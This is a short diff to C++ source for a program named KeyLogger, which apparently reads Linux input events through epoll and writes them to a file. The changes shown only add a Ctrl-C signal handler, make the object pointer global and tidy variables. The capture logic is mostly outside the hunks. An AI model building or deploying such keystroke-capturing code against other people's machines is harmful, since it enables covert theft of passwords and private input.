@@ -5,15 +5,18 @@
 #include <string.h>
 #include <errno.h>
 #include <sys/epoll.h>
+#include <signal.h>
 
 #define MAX_EVENTS 100
 
 using namespace std;
 
+void CTRL_C_Handler(int);
+
 class KeyLogger 
 {
 private:
-  int fd, efd, cfg, ret, n;
+  int fd, efd, cfg, ret;
   FILE *pFile;
   struct input_event ev;
   struct epoll_event ee, *events;
@@ -55,6 +58,7 @@ public:
 
   void log()
   {
+    signal(SIGINT, CTRL_C_Handler);
     while(1)
       {
 	ret = epoll_wait(efd, &ee, MAX_EVENTS, -1);
@@ -84,10 +88,17 @@ public:
 };
 
 
+KeyLogger *keylogger;
+
 int main(int argc, char **argv)
 {
-  KeyLogger *keylogger;
   keylogger = new KeyLogger(argc, argv);
   keylogger->log();
+  exit(-1);
+}
+
+void CTRL_C_Handler(int sig)
+{
   delete keylogger;
+  exit(0);
 }
